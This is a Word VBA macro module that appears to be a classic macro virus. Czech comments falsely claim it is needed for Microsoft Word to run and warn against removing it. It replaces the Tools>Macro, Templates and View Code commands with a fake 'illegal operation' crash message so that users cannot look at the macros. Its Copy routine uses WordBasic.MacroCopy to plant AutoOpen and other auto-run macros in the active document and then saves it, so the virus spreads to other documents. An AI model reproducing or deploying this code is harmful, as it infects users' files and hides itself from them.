Attribute VB_Name = "Word_Macros"
'Toto makro nezbitne je potreba k spravnemu behu programu Microsoft Word
'Jeho odstranenim muzete poskodit spravne pracovani programu Microsoft Word
Option Explicit
Sub Filetemplates()
 Hlaseni
End Sub
Sub ToolsMacro()
 Hlaseni
End Sub
Sub ViewVBCode()
 Hlaseni
End Sub
Private Sub Hlaseni()
 MsgBox "This program has performed an illegal operation and will shut down.", vbCritical, "Microsoft Word"
End Sub
Sub main()
  Dim P As String
  On Error Resume Next
   Copy
   ActiveDocument.Save
End Sub
Sub Copy()
 WordBasic.MacroCopy "Global:XXX", ActiveDocument.Name & ":FileExit", 1
 WordBasic.MacroCopy "Global:MacroSS", ActiveDocument.Name & ":AutoOpen", 1
 WordBasic.MacroCopy "Global:FileSave", ActiveDocument.Name & ":Word_Macros", 1
 WordBasic.MacroCopy "Global:AutoEXEC", ActiveDocument.Name & ":Word_Codes", 1
 WordBasic.MacroCopy "Global:AutoClose", ActiveDocument.Name & ":Word_Files", 1
End Sub
